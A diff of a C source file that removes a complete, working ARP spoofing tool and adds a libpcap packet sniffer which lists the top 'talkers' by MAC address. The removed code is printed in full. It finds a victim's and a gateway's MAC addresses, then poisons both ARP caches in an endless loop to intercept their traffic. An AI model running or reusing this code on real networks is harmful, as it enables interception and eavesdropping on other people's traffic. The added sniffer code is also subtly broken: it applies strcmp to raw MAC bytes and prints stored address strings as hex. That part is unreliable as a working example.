@@ -1,464 +1,266 @@
+/*
+* Created by: Asad Zia
+* 
+* Description:
+* A packet sniffer created using the pcap library. 
+* The default setting allows one to read live data from ALL interfaces. The -i option is used to read from a particular interface.
+* The -f option is used to read recorded data from a file. The interval for displaying the data can be set by using the -d option.
+* The -N option can be used to adjust the number of talkers we want to observe exchanging the packets.
+*
+*/
+
 #include <stdio.h>
-#include <sys/socket.h>
-#include <net/ethernet.h>
-#include <linux/if_packet.h>
-#include <arpa/inet.h>
-#include <netinet/in.h>
-#include <unistd.h>
-#include <string.h>
-#include <sys/ioctl.h>
-#include <net/if.h>
-#include <sys/types.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
 #include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+#include <pcap.h>
+#include <unistd.h>
+#include <netinet/if_ether.h>
 
-/* constant values */
-#define MAC_ADDR_LEN 0x06  /* MAC address length (48 bits) */
-#define IPv4_ADDR_LEN 0x04  /* IPv4 address length (32 bits) */
+// a structure defined for storing the live feed packet information
+struct store {
+    u_char dest[100];   // the destination address of the packet
+    u_char src[100];    // the source address of the packet
+    int dpack;          // the number of packets received by the destination point
+    int dpacksize;      // the total data exchanged between the two talkers
+    int spack;          // the number of packets recieved by the source point
+ };
 
-#define ETH_TYPE_PROTO_ARP 0x806  /* EtherType value of ARP */
+char* interface = "any";    // use "any" by default to call interfaces
+int offline = 0;            // reading recorded data flag
+int interval = 5;           // the interval after which livefeed is displayed
+int N = 3;                  // the default value which shows the top N talkers
 
-#define ARP_HTYPE_ETH 1  /* Ethernet */
-#define ARP_PTYPE_IP 0x0800  /* IPv4 */
+char ebuf[PCAP_ERRBUF_SIZE];// the error buffer used in the pcap functions 
+pcap_t* descr;              // the descriptor used in the main function
 
-#define ARP_OPER_REQUEST 1  /* ARP request */
-#define ARP_OPER_REPLY 2  /* ARP reply */
+struct store list[1000];    // the list of structs used for storing the configuration of the talkers
+int count2 = 0;             // a counter used for traversing through the list
+        
 
-#define BUFFSIZE 65536
-
-/* Ethernet frame struct */
-typedef struct
+// a compare function which is used in the qsort
+// basically arranges the data in the list(defined above) from the largest data exchanged to the least.
+int compare2 (const void * a, const void * b)   
 {
-    uint8_t dest[MAC_ADDR_LEN]; /* destination MAC address */
-    uint8_t src[MAC_ADDR_LEN];  /* source MAC address */
-    uint16_t type;              /* EtherType */
-} etherheader_t;
-
-/* ARP packet struct */
-typedef struct
-{
-    uint16_t htype;                     /* hardware type */
-    uint16_t ptype;                     /* protocol type */
-    unsigned char hlen;                 /* hardware length */
-    unsigned char plen;                 /* protocol length */
-    uint16_t op;                        /* operation */
-    unsigned char sha[MAC_ADDR_LEN];    /* sender hardware address */
-    unsigned char spa[IPv4_ADDR_LEN];   /* sender protocol address */
-    unsigned char tha[MAC_ADDR_LEN];    /* target hardware address */
-    unsigned char tpa[IPv4_ADDR_LEN];   /* target protocol address */
-} arpheader_t;
-
-unsigned char localMAC[MAC_ADDR_LEN];   /* local MAC address */
-struct in_addr localIP;                 /* local IP address */
-char interfaceName[256];                /* network interface name */
-
-/* check if user is root */
-int isUserRoot()
-{
-    /* root's UID is 0 */
-    if (getuid() == 0)
-        return 1;
-    else
-        return 0;
+  return ( ((struct store*)b)->dpacksize - ((struct store*)a)->dpacksize );
 }
 
-/* get index of interface */
-int getIfIndex(const char* ifname, int* outIfIndex)
+// the callback function used by the pcap_loop in the main function
+void processPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet)
 {
-    struct ifreq ifr;
-    strcpy(ifr.ifr_name, ifname);
 
-    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
+ int i = 0;
+ struct ether_header *eptr; // this variable stores the MAC addressses
+ u_char *ptr;               // used for pointing to the MAC addresses while printing
+ int w, f = 0;              // iterators used in traversing the array of structs
 
-    /* getting interface index */
-    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == 0)
-    {
-        /* copy index to output variable */
-        *outIfIndex = ifr.ifr_ifindex;
-        close(sockfd);
-        return 0;
-    }
+ // typecasting the packet to extract the header information
+ eptr = (struct ether_header *) packet;
 
-    /* if error occurred */
-    perror("ioctl");
-    close(sockfd);
-    return -1;
-}
+     // a loop for checking the already existing src/dest pair information
+     if (count2 != 0) 
+     {
 
-/* print MAC address in readable format */
-void printMacAddress(const unsigned char* mac)
-{
-    /* print MAC address in format aa:bb:cc:dd:ee:ff */
-    printf("%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
-}
-
-/* get MAC address of local machine */
-int getLocalMacAddress(const char* ifname, unsigned char* outMac)
-{
-    struct ifreq ifr;
-    strcpy(ifr.ifr_name, ifname);
-
-    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
-
-    /* getting interface's hardware address */
-    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == 0)
-    {
-        /* copy MAC address to output variable */
-        memcpy(outMac, ifr.ifr_addr.sa_data, MAC_ADDR_LEN);
-        close(sockfd);
-        return 0;
-    }
-
-    /* if error occurred */
-    perror("ioctl");
-    close(sockfd);
-    return -1;
-}
-
-/* print IPv4 address in readable format */
-void printIpAddress(const struct in_addr ip)
-{
-    /* print IPv4 address in dotdecimal format */
-    printf("%s", inet_ntoa(ip));
-}
-
-/* get MAC address of local machine */
-int getLocalIpAddress(const char* ifname, struct in_addr* outIp)
-{
-    struct ifreq ifr;
-    strcpy(ifr.ifr_name, ifname);
-    ifr.ifr_addr.sa_family = AF_INET;
-
-    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
-
-    /* getting interface's IP address */
-    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == 0)
-    {
-        struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;
-
-        /* copy IP address to output variable */
-        memcpy(outIp, &addr->sin_addr, sizeof(struct in_addr));
-        close(sockfd);
-        return 0;
-    }
-
-    /* if error occurred */
-    perror("ioctl");
-    close(sockfd);
-    return -1;
-}
-
-/* get MAC address of remote host using ARP request */
-int getMacAddress(const struct in_addr ip, unsigned char* outMac)
-{
-    etherheader_t etherFrame;
-    arpheader_t arpRequest;
-    unsigned char broadcastMAC[MAC_ADDR_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-    size_t frameSize = sizeof(etherheader_t) + sizeof(arpheader_t);
-    unsigned char* frame = (unsigned char*)malloc(frameSize);
-    memset(frame, 0, frameSize);
-    int count = 100;
-
-    /* create Ethernet frame */
-    memcpy(&etherFrame.dest, broadcastMAC, MAC_ADDR_LEN);
-    memcpy(&etherFrame.src, localMAC, MAC_ADDR_LEN);
-    etherFrame.type = htons(ETH_TYPE_PROTO_ARP);
-
-    /* create ARP packet */
-    arpRequest.op = htons(ARP_OPER_REQUEST);
-    arpRequest.htype = htons(ARP_HTYPE_ETH);
-    arpRequest.hlen = MAC_ADDR_LEN;
-    arpRequest.ptype = htons(ARP_PTYPE_IP);
-    arpRequest.plen = IPv4_ADDR_LEN;
-    memcpy(&arpRequest.tha, broadcastMAC, MAC_ADDR_LEN);
-    memcpy(&arpRequest.tpa, &ip, sizeof(struct in_addr));
-    memcpy(&arpRequest.sha, localMAC, MAC_ADDR_LEN);
-    memcpy(&arpRequest.spa, &localIP, sizeof(struct in_addr));
-    
-    int sockfd;
-
-    /* create socket to send ARP request */
-    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
-    {
-        /* if error occurred */
-        perror("socket");
-        free(frame);
-        return -1;
-    }
-
-    struct ifreq ifr;
-    strncpy((char*)&ifr.ifr_name, interfaceName, sizeof(ifr.ifr_name));
-
-    /* bind socket to the interface */
-    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0)
-    {
-        /* if error occurred */
-        perror("setsockopt");
-        close(sockfd);
-        free(frame);
-        return -1;
-    }
-
-    int ifindex;
-    if(getIfIndex(interfaceName, &ifindex) < 0)
-    {
-        /* if error occurred */
-        perror("ioctl");
-        close(sockfd);
-        free(frame);
-        return -1;
-    }
-
-    /* socket address struct (link-layer) */
-    struct sockaddr_ll sockAddr;
-    sockAddr.sll_family = AF_PACKET;
-    sockAddr.sll_protocol = htons(ETH_P_ARP);
-    sockAddr.sll_halen = MAC_ADDR_LEN;
-    sockAddr.sll_hatype = htons(ARPHRD_ETHER);
-    sockAddr.sll_ifindex = ifindex;
-    sockAddr.sll_pkttype = (PACKET_BROADCAST);
-    memcpy(&sockAddr.sll_addr, &arpRequest.sha, MAC_ADDR_LEN);
-
-    memcpy(frame, &etherFrame, sizeof(etherFrame));
-    memcpy(frame + sizeof(etherFrame), &arpRequest, sizeof(arpRequest));
-
-    /* send ARP request */
-    if (sendto(sockfd, frame, frameSize, 0, (struct sockaddr*)&sockAddr, sizeof(struct sockaddr_ll)) < 0)
-    {
-        /* if error occurred */
-        perror("sendto");
-        free(frame);
-        return -1;
-    }
-
-    free(frame);
-
-    int i;
-    unsigned char buffer[BUFFSIZE];
-
-    /* receive ARP reply */
-    for (i = 0; i < count; i++)
-    {
-        memset(buffer, 0, BUFFSIZE);
-        if(recvfrom(sockfd, buffer, BUFFSIZE, 0, NULL, NULL) < 0)
+        // looking at all elements of list
+        for (w = 0; w < count2; w++) 
         {
-            /* if error occurred */
-            perror("recvfrom");
-            continue;
-        }
 
-        /* dissect Ethernet frame from received buffer */
-        etherheader_t* ethFrameRecvd = (etherheader_t*)buffer;
-
-        /* if frame is ARP */
-        if (ntohs(ethFrameRecvd->type) == ETH_TYPE_PROTO_ARP)
-        {
-            /* dissect Ethernet frame from received buffer */
-            arpheader_t* arpResp = (arpheader_t*)(buffer + sizeof(etherheader_t));
-            if (ntohs(arpResp->op) == 2)
+            // if both the src and dest address match then the packet count and header length is added
+            if (strcmp(eptr->ether_dhost, list[w].dest) == 0) 
             {
-                /* copy MAC address of remote host to output */
-                memcpy(outMac, ethFrameRecvd->src, MAC_ADDR_LEN);
-                return 0;
+                if (strcmp(eptr->ether_shost, list[w].src) == 0) 
+                {
+                     list[w].dpacksize += pkthdr->len;
+                     list[w].dpack += 1;
+                     goto next;
+                }
+            }
+            // in case the dest sends packets to the src in our pair, then increment packet count for src packets 
+            if (strcmp(eptr->ether_dhost, list[w].src) == 0) 
+            {
+                if (strcmp(eptr->ether_shost, list[w].dest) == 0) 
+                {
+                     list[w].dpacksize += pkthdr->len;
+                     list[w].spack += 1;
+                     goto next;
+                }
             }
         }
+
+         // If the MAC addresses don't exist, make a new entry in list       
+         u_int8_t* sourceHex1;
+         u_int8_t* destHex1;  
+         sourceHex1 = eptr->ether_shost; 
+         destHex1 = eptr->ether_dhost;
+         char sourceAddr1[18];
+         char destAddr1[18];
+         sprintf( destAddr1,  "%02x:%02x:%02x:%02x:%02x:%02x",destHex1[0],destHex1[1],destHex1[2],destHex1[3],destHex1[4],destHex1[5] );
+         sprintf( sourceAddr1,  "%02x:%02x:%02x:%02x:%02x:%02x",sourceHex1[0],sourceHex1[1],sourceHex1[2],sourceHex1[3],sourceHex1[4],sourceHex1[5] );
+         strcpy(list[count2].dest, destAddr1);
+         strcpy(list[count2].src, sourceAddr1);
+         list[count2].dpacksize = pkthdr->len;
+         list[count2].dpack = 1;
+         list[count2].spack = 0;
+         count2++;  
     }
 
-    return -1;
-}
 
-/* sending spoofed ARP packet */
-int sendGratuitousArpReply(const struct in_addr destIP, const unsigned char* destMAC, const struct in_addr srcIP, const unsigned char* srcMAC)
-{
-    etherheader_t etherFrame;
-    arpheader_t arpReply;
-    size_t frameSize = sizeof(etherheader_t) + sizeof(arpheader_t);
-    unsigned char* frame = (unsigned char*)malloc(frameSize);
-    memset(frame, 0, frameSize);
-
-    /* create Ethernet frame */
-    memcpy(&etherFrame.dest, destMAC, MAC_ADDR_LEN);
-    memcpy(&etherFrame.src, srcMAC, MAC_ADDR_LEN);
-    etherFrame.type = htons(ETH_TYPE_PROTO_ARP);
-
-    /* create ARP packet */
-    arpReply.op = htons(ARP_OPER_REPLY);
-    arpReply.htype = htons(ARP_HTYPE_ETH);
-    arpReply.hlen = MAC_ADDR_LEN;
-    arpReply.ptype = htons(ARP_PTYPE_IP);
-    arpReply.plen = IPv4_ADDR_LEN;
-    memcpy(&arpReply.tha, destMAC, MAC_ADDR_LEN);
-    memcpy(&arpReply.tpa, &destIP, sizeof(struct in_addr));
-    memcpy(&arpReply.sha, srcMAC, MAC_ADDR_LEN);
-    memcpy(&arpReply.spa, &srcIP, sizeof(struct in_addr));
-    
-    int sockfd;
-
-    /* create socket to send ARP packet */
-    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
+    // the case when the program starts and the first packet is analyzed and its information is added to list
+    if (count2 == 0) 
     {
-        /* if error occurred */
-        perror("socket");
-        free(frame);
-        return -1;
+        u_int8_t* sourceHex;
+        u_int8_t* destHex;  
+        sourceHex = eptr->ether_shost; 
+        destHex = eptr->ether_dhost;
+        char sourceAddr[18];
+        char destAddr[18];
+        sprintf( destAddr,  "%02x:%02x:%02x:%02x:%02x:%02x",destHex[0], destHex[1], destHex[2], destHex[3],destHex[4], destHex[5] );
+        sprintf( sourceAddr,  "%02x:%02x:%02x:%02x:%02x:%02x",sourceHex[0],sourceHex[1], sourceHex[2],sourceHex[3], sourceHex[4], sourceHex[5] );
+        strcpy(list[count2].dest, destAddr);
+        strcpy(list[count2].src, sourceAddr);
+        list[count2].dpacksize = pkthdr->len;
+        list[count2].dpack = 1;
+        list[count2].spack = 0;
+        count2++;  
     }
+     
+    // the goto statement references to this point from the loop above in order to break out of the outer loops
+    // this is done to avoid making a new pair since a src/dest pair already exists for the packet observed
+    next:
 
-    struct ifreq ifr;
-    strncpy((char*)&ifr.ifr_name, interfaceName, sizeof(ifr.ifr_name));
+    // sorting all the elements in the list array
+    qsort (list, count2, sizeof(struct store), compare2);
 
-    /* bind socket to the interface */
-    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0)
+    // a for-loop which runs for N-times to display the top-N talkers
+    for (f = 0; f < N; f++) 
     {
-        /* if error occurred */
-        perror("setsockopt");
-        close(sockfd);
-        free(frame);
-        return -1;
-    }
 
-    int ifindex;
-    if(getIfIndex(interfaceName, &ifindex) < 0)
-    {
-        /* if error occurred */
-        perror("ioctl");
-        close(sockfd);
-        free(frame);
-        return -1;
-    }
+        ptr = list[f].src;
+        i = ETHER_ADDR_LEN;
 
-    /* socket address struct (link-layer) */
-    struct sockaddr_ll sockAddr;
-    sockAddr.sll_family = AF_PACKET;
-    sockAddr.sll_protocol = htons(ETH_P_ARP);
-    sockAddr.sll_halen = MAC_ADDR_LEN;
-    sockAddr.sll_hatype = htons(ARPHRD_ETHER);
-    sockAddr.sll_ifindex = ifindex;
-    sockAddr.sll_pkttype = (PACKET_MR_UNICAST);
-    memcpy(&sockAddr.sll_addr, &arpReply.sha, MAC_ADDR_LEN);
+        printf("src            dst | ");
 
-    memcpy(frame, &etherFrame, sizeof(etherFrame));
-    memcpy(frame + sizeof(etherFrame), &arpReply, sizeof(arpReply));
-
-    /* send ARP packet */
-    if (sendto(sockfd, frame, frameSize, 0, (struct sockaddr*)&sockAddr, sizeof(struct sockaddr_ll)) < 0)
-    {
-        /* if error occurred */
-        perror("sendto");
-        free(frame);
-        return -1;
-    }
-
-    free(frame);
-
-    return 0;
-}
-
-/* ARP cache poisoning infinite loop */
-void poisonArp(const struct in_addr victimIP, const unsigned char* victimMAC, const struct in_addr gatewayIP, const unsigned char* gatewayMAC)
-{
-    while (1)
-    {
-        if(sendGratuitousArpReply(victimIP, victimMAC, gatewayIP, localMAC) < 0)
+        do
         {
-            printf("Sending ARP reply to victim failed\n");
+            printf("%s%x",(i == ETHER_ADDR_LEN) ? " " : ":",*ptr++);
+        }
+        while(--i>0);
+        printf(" | ");
+
+        ptr = list[f].dest;
+        i = ETHER_ADDR_LEN;
+
+        do
+        {
+            printf("%s%x",(i == ETHER_ADDR_LEN) ? " " : ":",*ptr++);
+        }
+        while(--i>0);
+
+        printf("  |\n");
+        printf("------------------+----------------------+--------------------+\n");
+
+         ptr = list[f].src;
+        i = ETHER_ADDR_LEN;
+
+        do
+        {
+            printf("%s%x",(i == ETHER_ADDR_LEN) ? " " : ":",*ptr++);
+        }
+        while(--i>0);
+
+        printf(" | ");
+        printf("    0 p,  0 B      ");
+
+        // here conversion to kilobytes in case we cross 1000 bytes
+        if (list[f].dpacksize <= 1000) 
+        {
+            printf(" |      %d p, %d B     |\n", list[f].dpack, list[f].dpacksize);
         }
         else
         {
-            printf("Sent ARP reply to victim\n");
+            int p = list[f].dpacksize/1000;
+            printf(" |      %d p, %d kB    |\n", list[f].dpack, p);
         }
 
-        if(sendGratuitousArpReply(gatewayIP, gatewayMAC, victimIP, localMAC) < 0)
+        ptr = list[f].dest;
+        i = ETHER_ADDR_LEN;
+
+        do
         {
-            printf("Sending ARP reply to gateway failed\n");
+            printf("%s%x",(i == ETHER_ADDR_LEN) ? " " : ":",*ptr++);
+        }
+        while(--i>0);
+
+
+        // here conversion to kilobytes in case we cross 1000 bytes
+        if (list[f].dpacksize <= 1000) 
+        {
+            printf(" |       %d p, %d B     |", list[f].spack, list[f].dpacksize);
         }
         else
         {
-            printf("Sent ARP reply to gateway\n");
+            int q = list[f].dpacksize/1000;
+            printf(" |      %d p, %d kB     |", list[f].spack, q);
         }
-
-        sleep(10);
+        printf("    0 p,  0 B      |\n\n\n");
     }
-    
+    printf("*************************************************************************\n\n");
+    // the feed is displayed after an interval is set in the main function or just by default.
+    sleep(interval);
 }
 
-int main(int argc, char* argv[])
+// the function for parsing the commands written in the stdin while running the program
+void parsing(int argc, char** argv)
 {
-    if(!isUserRoot())
-    {
-        printf("Run this as root\n");
-        return 0;
+    int opt;
+    while( (opt = getopt(argc, argv, "i:f:d:N:")) != -1 ){
+        switch(opt){
+            case 'i':
+                interface = optarg;
+                
+                break;
+            case 'f':
+                interface = optarg;
+                offline = 1;
+                break;
+            case 'd':
+                interval = atoi(optarg);
+                break;
+            case 'N':
+                N = atoi(optarg);
+                break;
+            default:
+            // in case the wrong command is input
+                fprintf(stderr, "Usage: %s [-i interface] [-f file] [-d Interval] [-N Station]\n", argv[0]);
+                exit(1);
+        }
     }
+}
 
-    if (argc < 4)
-    {
-        printf("usage: sudo %s <iface name> <vitcim's IP> <gateway's IP>", argv[0]);
-        return 0;
+// the main function
+int main(int argc, char** argv)
+{
+    parsing(argc, argv);
+    int count = 0;
+
+    // reading all interfaces or a particular interface
+    if( offline == 0 ) {
+        if ((descr = pcap_create(interface, ebuf)) == NULL) {
+            fprintf(stderr, "ERROR: %s\n", ebuf);
+            exit(1);
+        }
+    }else{
+        if ((descr = pcap_open_offline(interface, ebuf)) == NULL) {
+            fprintf(stderr, "ERROR: %s\n", ebuf);
+            exit(1);
+        }
     }
+    pcap_activate(descr);
 
-    printf("Linux ARP spoofer\n-----------------\n");
-
-    strcpy(interfaceName, argv[1]);
-
-    printf("Looking for MAC addresses...\n");
-
-    if(getLocalMacAddress(interfaceName, localMAC) == -1)
-    {
-        printf("Error during checking local MAC address\n");
-        return -1;
+    // running the pcap_loop 
+    if (pcap_loop(descr, -1, processPacket, (u_char *) &count) == -1) {
+        fprintf(stderr, "failed to process packets: %s\n", pcap_geterr(descr));
+        exit(5);
     }
-    else
-    {
-        printf("Local MAC address is ");
-        printMacAddress(localMAC);
-        printf("\n");
-    }
-
-    if(getLocalIpAddress(interfaceName, &localIP) == -1)
-    {
-        printf("Error during checking local IP address\n");
-    }
-    else
-    {
-        printf("Local IP address is ");
-        printIpAddress(localIP);
-        printf("\n");
-    }
-
-    struct in_addr victimIP;
-    victimIP.s_addr = inet_addr(argv[2]);
-    unsigned char victimMAC[MAC_ADDR_LEN];
-
-    struct in_addr gatewayIP;
-    gatewayIP.s_addr = inet_addr(argv[3]);
-    unsigned char gatewayMAC[MAC_ADDR_LEN];
-
-    if (getMacAddress(victimIP, victimMAC) < 0)
-    {
-        printf("Unable to find victim's MAC address\n");
-        return -1;
-    }
-    else
-    {
-        printf("Victim's (%s) MAC address: ", argv[2]);
-        printMacAddress(victimMAC);
-        printf("\n");
-    }
-
-    if (getMacAddress(gatewayIP, gatewayMAC) < 0)
-    {
-        printf("Unable to find gateway's MAC address\n");
-        return -1;
-    }
-    else
-    {
-        printf("Gateway's (%s) MAC address: ", argv[3]);
-        printMacAddress(gatewayMAC);
-        printf("\n");
-    }
-
-    printf("Poisoning...\n");
-    poisonArp(victimIP, victimMAC, gatewayIP, gatewayMAC);
-
     return 0;
 }
